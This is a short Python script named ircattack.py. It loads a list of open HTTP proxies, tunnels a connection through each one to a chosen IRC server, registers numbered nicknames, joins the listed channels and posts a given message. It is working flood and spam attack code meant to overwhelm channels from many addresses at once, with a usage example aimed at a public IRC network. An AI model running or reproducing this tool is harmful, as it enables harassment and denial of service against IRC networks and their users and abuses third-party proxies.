""" Usage:
    python ircattack.py good_http_proxy irc.freenode.org 8000 alphaa "eu uaa ooo :real name" "#chan_1 chan_2 ..." "msg"
"""
from proxscan import *
import sys

script, source, target_ip, target_port, nick, user, chan_list, msg = sys.argv
REQUEST_HTTP = 'CONNECT %s:%s HTTP/1.0\r\n\r\n' % (target_ip, target_port)

chan_list = chan_list.split(' ')

def set_fire():
    database = load_data(source)
    index = 0

    def set_up_con(con, index):
        global chan_list
        global msg
        global nick
        global user
        Stdout(con)
        Stdin(con)
        Shrug(con)
 
        con.dump(REQUEST_HTTP)
        yield hold(con, DUMPED)
        con.dump('NICK %s%s\r\n' % (nick, index))
        con.dump('USER %s\r\n' % user)


        for ind in chan_list:
            con.dump('JOIN %s\r\n' % ind)
            con.dump('PRIVMSG %s :%s\r\n' % (ind, msg))
        

    for ind in database:
        ip, port = ind.group('ip', 'port')
        sock = socket(AF_INET, SOCK_STREAM)
        con = Spin(sock)
        Client(con)
    
        #xmap(con, FOUND, lambda con, data: sys.stdout.write('%s\n' % data))
        xmap(con, CONNECT, set_up_con, index)
        xmap(con, CLOSE, lose)
        con.connect_ex((ip, int(port))) 
        index = index + 1

if __name__ == '__main__':
    set_fire()
    gear.mainloop()
